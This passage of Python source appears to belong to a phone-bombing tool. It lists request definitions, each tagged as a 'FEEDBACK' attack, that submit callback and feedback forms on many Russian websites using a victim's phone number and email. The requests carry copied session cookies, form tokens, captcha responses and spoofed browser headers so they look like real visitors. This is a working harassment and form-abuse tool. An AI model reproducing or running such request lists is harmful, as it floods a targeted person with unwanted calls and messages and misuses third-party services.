            'data': f'------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="plugins"\r\n\r\nPDF Viewer | Chrome PDF Viewer | Chromium PDF Viewer | Microsoft Edge PDF Viewer | WebKit built-in PDF\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="parent_origin"\r\n\r\nhttps://rutaxi.ru/\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="js"\r\n\r\ntrue\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="date"\r\n\r\nSun Jun 11 2024 11:31:55 GMT+0500 (Таджикистан, стандартное время)\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="sk"\r\n\r\nyee7faeaee325bc69a13b69e64c85d713\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="_forms_yandexuid"\r\n\r\n2669523241687702926\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="visitId"\r\n\r\n5hz0e8ljbiqwlt\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="submitAttempt"\r\n\r\n1\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{number}\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW\r\nContent-Disposition: form-data; name="answer_short_text_10315845"\r\n\r\n\r\n------WebKitFormBoundaryJGoVJf1j1LYkiGFW--\r\n'.encode(),
            'params': {'utm_source': 'rutaxiru_mainblock', 'lpc_url': 'http://rutaxi.ru/driver/cities/saint-petersburg?utm_source=rutaxiru_mainblock', 'iframe': '1', 'lang': 'ru',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Braun-Russia.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.yandex.ru/cloud/5f8d61ad45cd2f8f37c3030e/',
            'headers': {'authority': 'forms.yandex.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarytH3WsEGhVHEMUHF5', 'origin': 'https://forms.yandex.ru', 'referer': 'https://forms.yandex.ru/cloud/5f8d61ad45cd2f8f37c3030e/?iframe=1', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'iframe', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="plugins"\r\n\r\nPDF Viewer | Chrome PDF Viewer | Chromium PDF Viewer | Microsoft Edge PDF Viewer | WebKit built-in PDF\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="parent_origin"\r\n\r\nhttps://braun-russia.ru/support\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="js"\r\n\r\ntrue\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="date"\r\n\r\nSun Jun 11 2024 11:31:55 GMT+0500 (Таджикистан, стандартное время)\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="sk"\r\n\r\ny2fd4e61b11105e0b0d7cf7577d6a2441\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="_forms_yandexuid"\r\n\r\n5924809191687704014\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="visitId"\r\n\r\ng0urp28ljbje7xi\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="submitAttempt"\r\n\r\n1\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_choices_96193"\r\n\r\n6564006\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_choices_4784345"\r\n\r\n6563997\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_choices_4786346"\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_short_text_4795916"\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_short_text_4786958"\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_files_4786737"\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="file"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_short_text_96201"\r\n\r\nINSIDE\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_non_profile_email_96202"\r\n\r\n{email()}\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_phone_4762131"\r\n\r\n{number}\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_short_text_4762306"\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_long_text_4762267"\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="answer_files_12274756"\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5\r\nContent-Disposition: form-data; name="file"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundarytH3WsEGhVHEMUHF5--\r\n'.encode(),
            'params': {'iframe': '1',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Globaldrive.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://globaldrive.ru/include/ajax/new_form.php',
            'cookies': {'utm_source': 'admitad', 'PHPSESSID': '6lnG3eGxuSnOsLoGcB4ebS4JZoOdG8Bu', 'deduplication_source': 'admitad', 'BITRIX_SM_GUEST_ID': '17923677', 'BITRIX_SM_SALE_UID': '7b71c6a1f86b0acc791d207e16844993', 'deduplication_cookie': 'admitad', 'deduplication_cookie': 'admitad', '_ga': 'GA1.1.770694863.1687704594', '_ym_uid': '1687704605147676021', 'rrpvid': '786891802081967', 'rcuid': '64985438ef0b6f85d3c38d92', '_ym_isad': '1', 'BX_USER_ID': '3c68ced18f985339d816e73a0b7ad8b1', '_tt_enable_cookie': '1', '_ttp': 'bIAVoPz1vzncXMtcTi88EXZQDa1', 'tagtag_aid': 'a2c09f3c3cdcee90d09ff8d20b1855f1', 'tagtag_aid': 'a2c09f3c3cdcee90d09ff8d20b1855f1', 'tt_deduplication_cookie': 'adm', 'tt_deduplication_cookie': 'adm', 'tmr_lvid': '831153cb1729078a19f3949c0a5340c7', 'tmr_lvidTS': '1687704638617', 'tmr_detect': '0%7C1687704640897', '_ga_8J955VS8QD': 'GS1.1.1687704593.1.1.1687704792.0.0.0', 'BITRIX_SM_LAST_VISIT': '25.06.2023%2017%3A53%3A37', '_ym_d': '1687704826',},
            'headers': {'authority': 'globaldrive.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryuMzAYCYt2SYI6fyj', 'origin': 'https://globaldrive.ru', 'referer': 'https://globaldrive.ru/?utm_source=admitad&tagtag_uid=a2c09f3c3cdcee90d09ff8d20b1855f1', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'iframe', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryuMzAYCYt2SYI6fyj\r\nContent-Disposition: form-data; name="bxajaxid"\r\n\r\ndbf932cca1c831b171b84eff6dfea5d5\r\n------WebKitFormBoundaryuMzAYCYt2SYI6fyj\r\nContent-Disposition: form-data; name="AJAX_CALL"\r\n\r\nY\r\n------WebKitFormBoundaryuMzAYCYt2SYI6fyj\r\nContent-Disposition: form-data; name="sessid"\r\n\r\ne78bd76f967217d2b7c9208318356032\r\n------WebKitFormBoundaryuMzAYCYt2SYI6fyj\r\nContent-Disposition: form-data; name="WEB_FORM_ID"\r\n\r\n1\r\n------WebKitFormBoundaryuMzAYCYt2SYI6fyj\r\nContent-Disposition: form-data; name="sessid"\r\n\r\ne78bd76f967217d2b7c9208318356032\r\n------WebKitFormBoundaryuMzAYCYt2SYI6fyj\r\nContent-Disposition: form-data; name="form_text_1"\r\n\r\nUsers\r\n------WebKitFormBoundaryuMzAYCYt2SYI6fyj\r\nContent-Disposition: form-data; name="form_text_2"\r\n\r\n+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundaryuMzAYCYt2SYI6fyj\r\nContent-Disposition: form-data; name="web_form_submit"\r\n\r\nОтправить\r\n------WebKitFormBoundaryuMzAYCYt2SYI6fyj--\r\n'.encode(),
            'params': {'id': 'callback',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Inetcom.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://inetcom.ru/about/feedback/tv/1/login/',
            'cookies': {'PHPSESSID': 'vqeltuua8l7tfo2trmrpajmb3j', '_ym_uid': '1687705321633349630', '_ym_d': '1687705321', '_ym_isad': '1', '__utma': '130032983.1532799604.1687705321.1687705321.1687705321.1', '__utmc': '130032983', '__utmz': '130032983.1687705321.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', '__utmt': '1', '__utmb': '130032983.1.10.1687705321', '_ym_visorc': 'w',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://inetcom.ru', 'Referer': 'https://inetcom.ru/about/feedback/tv/1/login/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'tv': '1', 'tv_login': '', 'xx': '57622faf0e670100f51a9709d57494f7', 'PHPSESSID': 'vqeltuua8l7tfo2trmrpajmb3j', 'agreement_num': '', 'code_phone': str(number)[1:4], 'phone': str(number)[4:], 'email': email(), 'fio': 'INSIDE', 'comment': 'INSIDE', 'processingPersonalData': 'on', 'client_os': 'undefined 64-bit', 'client_browser': 'Chrome ru 112.0.0.0 ', 'client_screen': '1730x973', 'client_java': 'none', 'client_vlc': 'none', 'client_plugins': 'PDF Viewer - \r\nChrome PDF Viewer - \r\nChromium PDF Viewer - \r\nMicrosoft Edge PDF Viewer - \r\nWebKit built-in PDF - \r\n',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'WiFiLine.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.tildacdn.com/procces/',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://wifiline.ru', 'Referer': 'https://wifiline.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'formservices%5B%5D=3b6d2a85ad66c1154d3f44d1b2f33066&formservices%5B%5D=80bfcdbf772c1490c5b0dd3c263d3569&formservices%5B%5D=25a68f7d3c1ebbc4528cff264ecd33c3&Name=INSIDE&tildaspec-phone-part%5B%5D-iso=+7&tildaspec-phone-part%5B%5D=+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&Phone=+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&%D0%A2%D0%B8%D0%BF+%D0%B2%D0%B8%D0%B4%D0%B5%D0%BE%D0%BD%D0%B0%D0%B1%D0%BB%D1%8E%D0%B4%D0%B5%D0%BD%D0%B8%D1%8F=%D0%9E%D1%85%D1%80%D0%B0%D0%BD%D0%BD%D0%BE%D0%B5&form-spec-comments=&tildaspec-cookie=tildauid%3D1687856513427.944337%3B+tildasid%3D1687856513427.426625%3B+_ym_uid%3D1687856515539180134%3B+_ym_d%3D1687856515%3B+_ym_isad%3D1%3B+_ym_visorc%3Dw%3B+previousUrl%3Dwifiline.ru%252Ftilda%252Fform461988694%252Fsubmitted%252F&tildaspec-referer=https%3A%2F%2Fwifiline.ru%2F%230&tildaspec-formid=form461988701&tildaspec-formskey=a920a03adc40088bc4b5b29fbc9f7d7a&tildaspec-version-lib=02.001&tildaspec-pageid=28584878&tildaspec-projectid=3635382&tildaspec-lang=RU&tildaspec-fp=6354646d38686331326c72757057696e333276476f6f676c6520496e632e614d6f7a696c6c616e4e65747363617065706c696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d766965776572696e7465726e616c2d7064662d7669657765727072312e31313030303030313433303531313437773130373868383338&tildaspec-tildacaptcha=03AL8dmw_493_TXT6bBqBsIZHyyRNoQoL6zNabFGKplrYLL2ZvZKThr07OcrrZQGPPBXf1K1F1U0kj78iP8UShFZ2ZytvXHWFYEjr7r5gpMI-lCj_2HuwHy5ccwpwG_Z_OG4hIpUJVQ8D8dKUREwMHc2Q464TZiijJ4XPuFguJmVqiQgrqk4q0ZmpwM5ZIeb6piNLpZG3Jbkn0BNKXM-Yx43cwGxNXccVvFhJmPHBQXkV94NSiaek5tikWQCj30epErOjNWRlE6jokQNZylC2UADaPojYmbDmZf2N6GoOn6VV8qz6RyZOGRKl_7M9lfQfEbtLovD3bwk09xrrOboZkYd276OlqFeeOSBNA5ryQV9uGhjhjUKS211KPRwx5WuOIJx1YkBgEjoA01cNWOtoJ-vm1NeUSi_0mqrYuS3ryk8_egfKtgGanMr13kaEe5-Ttn-yE5_mRt1Th35_dueTYLa1BTx7aetb8IadOhirjX9h2d5gIJHQwzy9aikZ0FeqDkvy-LpbBdCGgzgkUTmWGIP04MWFIDFi44VInm9WbSv6c9OU3e_09AtaF95bQMCuwHitXypnOhc4S',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'PowerNet.com.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://powernet.com.ru/connect2.php',
            'cookies': {'_ym_uid': '1687858637804695436', '_ym_d': '1687858637', '_ym_isad': '1', 'tmr_lvid': 'a8cf61a8a7da7650beced8cefe5abcdc', 'tmr_lvidTS': '1687858637429', '_ym_visorc': 'w', 'tmr_detect': '0%7C1687858647122',},
            'headers': {'authority': 'powernet.com.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://powernet.com.ru', 'referer': 'https://powernet.com.ru/connection', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'name': 'INSIDE', 'telefone': f'+7({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 'address': '', 'apart': '', 'city': '', 'street': '', 'house': '', 'freeAddress': '', 'stadia': '', 'region': '', 'tariff': '',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': '01rus.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://01rus.ru/wp-content/themes/mediagrand/ajax/post_support.php',
            'cookies': {'_ym_uid': '1687858933561646217', '_ym_d': '1687858933', '_ym_isad': '1', '_ym_visorc': 'w',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://01rus.ru', 'Referer': 'https://01rus.ru/help/support/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'name=INSIDE&sername=INSIDE&phone=+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&email={email()}&message=INSIDE',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Isp-Vrn.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://isp-vrn.ru/ekaterinburg/provider/abv',
            'cookies': {'AUTH': '4f7fd1ecaeeab4d447f4b79f2128e6a6f3054010', '_ga': 'GA1.2.75182502.1687859282', '_gid': 'GA1.2.662010170.1687859282', '_ym_uid': '1687859282861545768', '_ym_d': '1687859282', '_ym_isad': '1', '_ga_B9NE6BD817': 'GS1.2.1687859282.1.0.1687859282.0.0.0', '_ym_visorc': 'w',},
            'headers': {'authority': 'isp-vrn.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://isp-vrn.ru', 'referer': 'https://isp-vrn.ru/ekaterinburg/provider/abv', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'t[address]': 'г Екатеринбург, ул 40-летия Комсомола ', 't[name]': 'INSIDE', 't[phone]': f'8 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 't[url_ticket_page]': '/ekaterinburg/provider/abv', 't[dadata_address_object]': '{"value":"г Екатеринбург, ул 40-летия Комсомола","unrestricted_value":"Свердловская обл, г Екатеринбург, Кировский р-н, ул 40-летия Комсомола","data":{"postal_code":null,"country":"Россия","country_iso_code":"RU","federal_district":"Уральский","region_fias_id":"92b30014-4d52-4e2e-892d-928142b924bf","region_kladr_id":"6600000000000","region_iso_code":"RU-SVE","region_with_type":"Свердловская обл","region_type":"обл","region_type_full":"область","region":"Свердловская","area_fias_id":null,"area_kladr_id":null,"area_with_type":null,"area_type":null,"area_type_full":null,"area":null,"city_fias_id":"2763c110-cb8b-416a-9dac-ad28a55b4402","city_kladr_id":"6600000100000","city_with_type":"г Екатеринбург","city_type":"г","city_type_full":"город","city":"Екатеринбург","city_area":null,"city_district_fias_id":null,"city_district_kladr_id":null,"city_district_with_type":"Кировский р-н","city_district_type":"р-н","city_district_type_full":"район","city_district":"Кировский","settlement_fias_id":null,"settlement_kladr_id":null,"settlement_with_type":null,"settlement_type":null,"settlement_type_full":null,"settlement":null,"street_fias_id":"d1a37d8d-25a5-4d57-a8fc-2a665428684a","street_kladr_id":"66000001000001000","street_with_type":"ул 40-летия Комсомола","street_type":"ул","street_type_full":"улица","street":"40-летия Комсомола","stead_fias_id":null,"stead_cadnum":null,"stead_type":null,"stead_type_full":null,"stead":null,"house_fias_id":null,"house_kladr_id":null,"house_cadnum":null,"house_type":null,"house_type_full":null,"house":null,"block_type":null,"block_type_full":null,"block":null,"entrance":null,"floor":null,"flat_fias_id":null,"flat_cadnum":null,"flat_type":null,"flat_type_full":null,"flat":null,"flat_area":null,"square_meter_price":null,"flat_price":null,"room_fias_id":null,"room_cadnum":null,"room_type":null,"room_type_full":null,"room":null,"postal_box":null,"fias_id":"d1a37d8d-25a5-4d57-a8fc-2a665428684a","fias_code":null,"fias_level":"7","fias_actuality_state":"0","kladr_id":"66000001000001000","geoname_id":"1486209","capital_marker":"2","okato":"65401373000","oktmo":"65701000001","tax_office":"6670","tax_office_legal":"6670","timezone":null,"geo_lat":"56.833865","geo_lon":"60.694304","beltway_hit":null,"beltway_distance":null,"metro":null,"divisions":null,"qc_geo":"2","qc_complete":null,"qc_house":null,"history_values":null,"unparsed_parts":null,"source":null,"qc":null}}', 't[tariff_id]': '0', 't[house_type]': 'flat',},
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Tele-C.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://tele-c.ru/assets/components/ajaxform/action.php',
            'cookies': {'beget': 'begetok', 'PHPSESSID': '31fda788bfbe97cdcb0f423353fbea38', '_ym_uid': '1687860569193663090', '_ym_d': '1687860569', '_ga': 'GA1.2.2052587349.1687860569', '_gid': 'GA1.2.1654802817.1687860569', '_ym_visorc': 'w', '_ym_isad': '1', '_gat_gtag_UA_194491635_1': '1',},
            'headers': {'authority': 'tele-c.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://tele-c.ru', 'referer': 'https://tele-c.ru/kontakty', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'name=INSIDE&fragburg=&phone=+7 ({str(number)[1:4]}) {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}&city=%D0%A1%D0%BB%D0%B0%D0%B2%D1%8F%D0%BD%D1%81%D0%BA-%D0%BD%D0%B0-%D0%9A%D1%83%D0%B1%D0%B0%D0%BD%D0%B8&g-recaptcha-response=03AL8dmw9gxEZu4vEFrztKGjPdvjxYXDKbCD_nnNeeosQYttMvbbRA1FvCtZ8LqsCEzaf1fi-ICZRxCzxJ8xGX0pmBJFbJp03kSEAq0Bu4VfdivbtDLxN4czfg0SzAG3rNq80AJMh49IMvn1CKIWyiu_DqwoOmANK8lYncrUly6pinbDANZsD1MQ1ZdFw2XW_mtghlv-v-I7GXvtzRQBspaK3KPHr_cln0FTaUqNAJeqqH0bY97Fgk0lEsLYpjPn3pPkHBVWY2vzCSSNZYVxZpVu033VINUiF2roYgW3NzYn8AzjNOd3ZIqAv1GbaAg5u2H5ZN63Tj7AZ97hOUC5NJ9qYioEPyvaHRVygmjmb0mlRdWUxHeMvLVkn86t4MKd10_uLooEL-G7Dd4_keldNU-7R88Z44frfI7BleiSZ1bCD3uKyR5haXqd4ZkehuJ9PXnSz43c-Dyo4MbdNPlFvgCMNEmzUAZRwJRMCRAbhN4daN4TroUhdbJCNn16W1V8UBaVWGgKONdH6SiaCNb8PBAapM3JRXN7HTFSqNHTJn56E0C3Tz0MpiJErZhwKvmijhZLnhlIr5U0JlVnPpvLxsKFzOc_lUMoDGnqqTohlqdbbyiNH-vSL4E9kR8o1N60acAhhK0TjI7n-yun7SrlOrhpW3m2HkinFUptZXU9kTd5ENM1yboTRV7pDwbBxSaiiqacjYr_9JDSu6d0apuZig8Q1lvsdjOvMqTdgDrPUZ733_2mMxgI4adv0xJYqdoJy0uFXFEG9zhKG2ssJhVUP5DqQ_85Uxu5M9-kfIhZmwW3HvZ9Ygm58DPyCXAT_t_sSNRNpJtbhZePsft94AR6U0ebLzsw-xgftgeDkMbHnK3BHj0vudRrkKP_tYXRI7dLW6vaLdaugYMMqRSZGZ2j-qK3RXu2AhLDg-79kgOZ__S2Ncfpol8H_4fu_fy9TUjAL-gN5ohq_OgT1OVPcuuwGNgkgrb3_cGrGeREmEtRqCJ5TBrmqFpnoFbguT_AqcO0oW6l7EByWtSS6CKckiefolHkaduqUmHgb_vN3y649UFUH4EuxQXmW57avoLCuTLOuSoBxZKclu92cDFoptmnvZQ5CzdYfSFjeISxcNCpq4WN6rS3qF_Z9PRuPrLE6P1TdAIfYVdWQ6vWMim7iK8GjwD-SbLtUwDFIzAWY2xrDhmWVw1hFYdQjWIKEfKGkDs6TIw2yv5pLPd0KPdL8RBKDgkwtkt9hkhbgxtCRZf4pwtnOHL1ZfzVbcIzHqjEyrQK4INcWqTjba8ms3zUJb7HCEximAjZqXqWajS7fRnZd4kOOjKVffZohpGNwXaA0dnCIkno1sjpudXfn_ntEBOXG2dxucl9XMsohrRe_NdapNnPppJOrqVG_VmglkvRMN9-M0790kmiD6WzeNZZXrYwSyJd7TtDME5bkW7Agvc_ADNdnb1THLx1fKjlJ5jQaAmOv3SwE4RQ4ruLdX&af_action=ab3fbec0432d892d9ab23f8c6f1fca90&pageId=8',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'Trytek.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://trytek.ru/forms/home',
            'cookies': {'laravel_session': 'eyJpdiI6IlNlTjU5TnRNb1FKZklaRFpTdFdJUlE9PSIsInZhbHVlIjoicWQ2SjhYYnpKcXh6aE5FWFM2WTVTdjlJK0sxcVNmZFFFRjBIdFY1cWYwS0lQWWptVkdJcDVNM2tTbkhrTDRDaiIsIm1hYyI6IjRkMTlhMmZhOGNiZTViOWYyZTJhMTg5MjhkZmE3OWQ1OWZhYzlhOThlNDIzZTM3MjJiNWM4OThkNDkzM2VkNmEifQ%3D%3D', '_gcl_au': '1.1.1226317814.1687861046', '_ym_uid': '1687861047716175834', '_ym_d': '1687861047', 'tmr_lvid': '79b122af55e975af7d779668ddcac077', 'tmr_lvidTS': '1687861047124', '_ga_8317C2RJ6F': 'GS1.1.1687861047.1.0.1687861047.60.0.0', '_ym_isad': '1', '_ga': 'GA1.2.1311331491.1687861047', '_gid': 'GA1.2.341950017.1687861047', '_gat_gtag_UA_115521822_1': '1', '_ym_visorc': 'w', 'tmr_detect': '0%7C1687861049943',},
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryiAo7msiDwf4aPqkF', 'Origin': 'https://trytek.ru', 'Referer': 'https://trytek.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryiAo7msiDwf4aPqkF\r\nContent-Disposition: form-data; name="name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryiAo7msiDwf4aPqkF\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+7 {str(number)[1:4]} {str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}\r\n------WebKitFormBoundaryiAo7msiDwf4aPqkF\r\nContent-Disposition: form-data; name="city_id"\r\n\r\n11\r\n------WebKitFormBoundaryiAo7msiDwf4aPqkF--\r\n',
        },
        {
            'info': {'country': 'RU', 'attack': 'FEEDBACK', 'website': 'E-Interra.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://e-interra.ru/wp-admin/admin-ajax.php',
